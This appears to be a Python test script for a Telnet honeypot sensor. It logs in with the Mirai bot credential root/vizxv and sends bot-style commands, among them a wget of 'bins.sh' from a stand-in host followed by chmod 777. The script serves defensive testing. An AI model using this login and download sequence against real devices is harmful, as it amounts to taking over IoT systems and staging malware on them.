"""Logs in to the Telnet sensor with a classic bot credential and runs a few commands.

Usage: python telnet-test.py HOST PORT
"""

import re
import socket
import sys
import time

IAC = 0xFF


def strip_iac(data: bytes) -> bytes:
    """Removes Telnet option negotiation bytes (IAC + command + option)."""
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 2 < len(data) + 1:
            i += 3 if data[i + 1] in (251, 252, 253, 254) else 2
        else:
            out.append(data[i])
            i += 1
    return bytes(out)


def read_until(s: socket.socket, pattern: bytes, timeout: float = 15.0) -> bytes:
    buf = b""
    end = time.monotonic() + timeout
    while time.monotonic() < end and not re.search(pattern, strip_iac(buf)):
        try:
            chunk = s.recv(4096)
        except TimeoutError:
            continue
        if not chunk:
            break
        buf += chunk
    return strip_iac(buf)


def main() -> int:
    host, port = sys.argv[1], int(sys.argv[2])
    with socket.create_connection((host, port), timeout=10) as s:
        s.settimeout(2)
        read_until(s, rb"login: ")
        s.sendall(b"root\r\n")
        read_until(s, rb"Password: ")
        s.sendall(b"vizxv\r\n")
        banner = read_until(s, rb"# $")
        if b"#" not in banner:
            print(f"login failed: {banner!r}", file=sys.stderr)
            return 1
        for cmd in (
            b"uname -a",
            b"/bin/busybox ECCHI",
            b"cd /tmp; wget http://198.51.100.7/bins.sh -O bins.sh; chmod 777 bins.sh",
        ):
            s.sendall(cmd + b"\r\n")
            read_until(s, rb"# $")
        s.sendall(b"exit\r\n")
        time.sleep(0.5)
    print("Telnet login and commands done")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
